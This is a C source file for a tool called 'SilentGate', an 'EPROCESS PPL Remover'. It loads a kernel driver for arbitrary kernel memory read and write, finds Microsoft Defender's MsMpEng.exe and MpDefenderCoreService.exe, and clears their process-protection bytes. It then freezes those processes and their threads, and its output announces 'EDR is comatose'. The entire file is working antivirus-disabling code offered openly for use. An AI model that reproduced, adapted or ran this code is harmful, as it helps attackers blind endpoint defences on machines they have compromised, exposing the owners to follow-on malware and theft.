#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdio.h>

#define IOCTL_SG_READ_VIRTUAL  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SG_WRITE_VIRTUAL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)
typedef struct { ULONG64 address; ULONG size; UCHAR data[256]; } SG_MEM;
static HANDLE g_h = INVALID_HANDLE_VALUE;

#define EPROCESS_UNIQUEPID   0x440
#define EPROCESS_ACTIVELINKS 0x448
#define EPROCESS_SIG         0x878
#define EPROCESS_SECSIG      0x879
#define EPROCESS_PROTECTION  0x87A

BOOL vm_read(ULONG64 addr, PVOID buf, ULONG size) {
    SG_MEM req={0}; req.address=addr; req.size=size<256?size:256;
    DWORD bytes=0;
    return DeviceIoControl(g_h,IOCTL_SG_READ_VIRTUAL,
        &req,sizeof(req),buf,size,&bytes,NULL);
}

BOOL vm_write(ULONG64 addr, PVOID buf, ULONG size) {
    SG_MEM req={0}; req.address=addr; req.size=size<256?size:256;
    if(req.size>0) memcpy(req.data,buf,req.size);
    DWORD bytes=0;
    return DeviceIoControl(g_h,IOCTL_SG_WRITE_VIRTUAL,
        &req,sizeof(req),&req,sizeof(req),&bytes,NULL);
}

int load_driver(const char* path) {
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE ex=OpenServiceA(scm,"SilentGate",SERVICE_ALL_ACCESS);
    if(ex){SERVICE_STATUS ss;ControlService(ex,SERVICE_CONTROL_STOP,&ss);
        DeleteService(ex);CloseServiceHandle(ex);Sleep(500);}
    SC_HANDLE svc=CreateServiceA(scm,"SilentGate","SilentGate",
        SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,path,NULL,NULL,NULL,NULL,NULL);
    if(!svc){CloseServiceHandle(scm);return 0;}
    BOOL ok=StartServiceA(svc,0,NULL);
    CloseServiceHandle(svc);CloseServiceHandle(scm);
    return ok;
}

void unload_driver() {
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE svc=OpenServiceA(scm,"SilentGate",SERVICE_ALL_ACCESS);
    if(svc){SERVICE_STATUS ss;ControlService(svc,SERVICE_CONTROL_STOP,&ss);
        Sleep(500);DeleteService(svc);CloseServiceHandle(svc);}
    CloseServiceHandle(scm);
}

DWORD64 get_ntos() {
    DWORD n=0; EnumDeviceDrivers(NULL,0,&n);
    LPVOID* d=(LPVOID*)malloc(n); EnumDeviceDrivers(d,n,&n);
    DWORD64 base=0; char name[MAX_PATH];
    for(DWORD i=0;i<n/sizeof(LPVOID);i++){
        GetDeviceDriverBaseNameA(d[i],name,MAX_PATH);
        if(_stricmp(name,"ntoskrnl.exe")==0||_stricmp(name,"ntkrnlmp.exe")==0)
            {base=(DWORD64)d[i];break;}
    } free(d); return base;
}

DWORD64 get_export(DWORD64 base, const char* name) {
    char path[MAX_PATH]; GetSystemDirectoryA(path,MAX_PATH);
    strcat(path,"\\ntoskrnl.exe");
    HMODULE h=LoadLibraryExA(path,NULL,DONT_RESOLVE_DLL_REFERENCES);
    FARPROC f=GetProcAddress(h,name);
    DWORD64 off=(DWORD64)f-(DWORD64)h; FreeLibrary(h);
    return base+off;
}

DWORD64 find_eprocess(DWORD64 ntos, DWORD target_pid) {
    DWORD64 psisp=get_export(ntos,"PsInitialSystemProcess");
    DWORD64 system_ep=0;
    vm_read(psisp,&system_ep,8);
    if(!system_ep) return 0;

    DWORD64 current=system_ep;
    int max=500;
    while(max--){
        DWORD pid=0;
        vm_read(current+EPROCESS_UNIQUEPID,&pid,4);
        if(pid==target_pid) return current;
        DWORD64 flink=0;
        vm_read(current+EPROCESS_ACTIVELINKS,&flink,8);
        if(!flink||flink==current+EPROCESS_ACTIVELINKS) break;
        current=flink-EPROCESS_ACTIVELINKS;
    }
    return 0;
}

typedef NTSTATUS (NTAPI *pNtSuspendProcess)(HANDLE);
typedef NTSTATUS (NTAPI *pNtResumeProcess)(HANDLE);

int main() {
    printf("[V9] SilentGate v9.0 - EPROCESS PPL Remover\n");
    printf("[V9] Author: JarDani\n\n");

    /* Enable SeDebugPrivilege */
    HANDLE hToken=NULL;
    OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken);
    TOKEN_PRIVILEGES tp={0};
    tp.PrivilegeCount=1;
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueA(NULL,"SeDebugPrivilege",&tp.Privileges[0].Luid);
    AdjustTokenPrivileges(hToken,FALSE,&tp,0,NULL,NULL);
    CloseHandle(hToken);
    printf("[V9] SeDebugPrivilege enabled\n\n");

    char drv[MAX_PATH],dir[MAX_PATH];
    GetModuleFileNameA(NULL,dir,MAX_PATH);
    char* p=strrchr(dir,'\\');if(p)*p='\0';
    snprintf(drv,MAX_PATH,"%s\\sg_driver.sys",dir);

    if(!load_driver(drv)){printf("Load failed\n");getchar();return 1;}
    g_h=CreateFileA("\\\\.\\SilentGate",GENERIC_READ|GENERIC_WRITE,0,NULL,
        OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(g_h==INVALID_HANDLE_VALUE){
        printf("Device failed\n");unload_driver();getchar();return 1;}

    printf("[V9] Kernel R/W ready\n\n");

    DWORD64 ntos=get_ntos();
    printf("[V9] ntoskrnl: 0x%llX\n\n",ntos);

    /* Find Defender PIDs */
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    PROCESSENTRY32 pe; pe.dwSize=sizeof(pe);
    DWORD msmpeng_pid=0,mpcore_pid=0;
    if(Process32First(snap,&pe)){
        do{
            if(_stricmp(pe.szExeFile,"MsMpEng.exe")==0) msmpeng_pid=pe.th32ProcessID;
            if(_stricmp(pe.szExeFile,"MpDefenderCoreService.exe")==0) mpcore_pid=pe.th32ProcessID;
        }while(Process32Next(snap,&pe));
    }
    CloseHandle(snap);

    printf("[V9] MsMpEng PID: %lu\n",msmpeng_pid);
    printf("[V9] MpDefenderCore PID: %lu\n\n",mpcore_pid);

    DWORD targets[]={msmpeng_pid,mpcore_pid,0};
    const char* names[]={"MsMpEng","MpDefenderCoreService"};

    for(int t=0;t<2;t++){
        if(!targets[t]) continue;
        printf("[V9] Processing %s (PID %lu)...\n",names[t],targets[t]);

        DWORD64 eproc=find_eprocess(ntos,targets[t]);
        if(!eproc){printf("[V9] EPROCESS not found\n\n");continue;}
        printf("[V9] EPROCESS: 0x%llX\n",eproc);

        /* Read current values */
        BYTE sig=0,secsig=0,prot=0;
        vm_read(eproc+EPROCESS_SIG,    &sig,    1);
        vm_read(eproc+EPROCESS_SECSIG, &secsig, 1);
        vm_read(eproc+EPROCESS_PROTECTION, &prot, 1);
        printf("[V9] Before: Sig=0x%02X SecSig=0x%02X Prot=0x%02X\n",
            sig,secsig,prot);

        /* Clear all three */
        BYTE z=0;
        vm_write(eproc+EPROCESS_SIG,    &z,1);
        vm_write(eproc+EPROCESS_SECSIG, &z,1);
        vm_write(eproc+EPROCESS_PROTECTION,&z,1);

        /* Verify */
        BYTE sig2=0,secsig2=0,prot2=0;
        vm_read(eproc+EPROCESS_SIG,    &sig2,    1);
        vm_read(eproc+EPROCESS_SECSIG, &secsig2, 1);
        vm_read(eproc+EPROCESS_PROTECTION,&prot2,1);
        printf("[V9] After : Sig=0x%02X SecSig=0x%02X Prot=0x%02X\n",
            sig2,secsig2,prot2);
        printf("[V9] PPL cleared for %s\n\n",names[t]);
    }

    /* Open handles AFTER PPL removal */
    printf("[V9] Opening handles after PPL removal...\n");
    HANDLE hMsMpEng=OpenProcess(PROCESS_ALL_ACCESS,FALSE,msmpeng_pid);
    HANDLE hMpCore =OpenProcess(PROCESS_ALL_ACCESS,FALSE,mpcore_pid);

    printf("[V9] MsMpEng handle: %p (err=%lu)\n",hMsMpEng,hMsMpEng?0:GetLastError());
    printf("[V9] MpCore handle : %p (err=%lu)\n\n",hMpCore,hMpCore?0:GetLastError());

    HMODULE ntdll=GetModuleHandleA("ntdll.dll");
    pNtSuspendProcess NtSuspendProcess=
        (pNtSuspendProcess)GetProcAddress(ntdll,"NtSuspendProcess");
    pNtResumeProcess NtResumeProcess=
        (pNtResumeProcess)GetProcAddress(ntdll,"NtResumeProcess");

    int suspended=0;

    if(hMsMpEng){
        NTSTATUS s=NtSuspendProcess(hMsMpEng);
        printf("[V9] NtSuspendProcess MsMpEng: 0x%X %s\n",
            s,s==0?"SUCCESS":"FAILED");
        if(s==0) suspended++;
    }

    if(hMpCore){
        NTSTATUS s=NtSuspendProcess(hMpCore);
        printf("[V9] NtSuspendProcess MpCore: 0x%X %s\n",
            s,s==0?"SUCCESS":"FAILED");
        if(s==0) suspended++;
    }

    if(suspended>0){
        printf("\n[V9] %d Defender processes FROZEN\n",suspended);
        printf("[V9] EDR is comatose\n");
        printf("[V9] Press Enter to resume...\n");
        getchar();
        if(hMsMpEng) NtResumeProcess(hMsMpEng);
        if(hMpCore)  NtResumeProcess(hMpCore);
        printf("[V9] Defender resumed\n");
    }

    /* Try suspending individual threads instead */
    printf("\n[V9] Trying thread-level suspension of MsMpEng...\n");
    HANDLE tsnap=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
    THREADENTRY32 te; te.dwSize=sizeof(te);
    int t_suspended=0;
    if(Thread32First(tsnap,&te)){
        do{
            if(te.th32OwnerProcessID==msmpeng_pid){
                HANDLE ht=OpenThread(THREAD_SUSPEND_RESUME,FALSE,te.th32ThreadID);
                if(ht){
                    DWORD r=SuspendThread(ht);
                    if(r!=0xFFFFFFFF){
                        printf("[V9] Thread %lu suspended\n",te.th32ThreadID);
                        t_suspended++;
                    }
                    CloseHandle(ht);
                }
            }
        }while(Thread32Next(tsnap,&te));
    }
    CloseHandle(tsnap);
    printf("[V9] Threads suspended: %d\n",t_suspended);

    if(hMsMpEng) CloseHandle(hMsMpEng);
    if(hMpCore)  CloseHandle(hMpCore);
    CloseHandle(g_h);
    unload_driver();
    printf("\n[V9] Done - press Enter\n");
    getchar();
    return 0;
}
/* This won't append - rewriting inline */
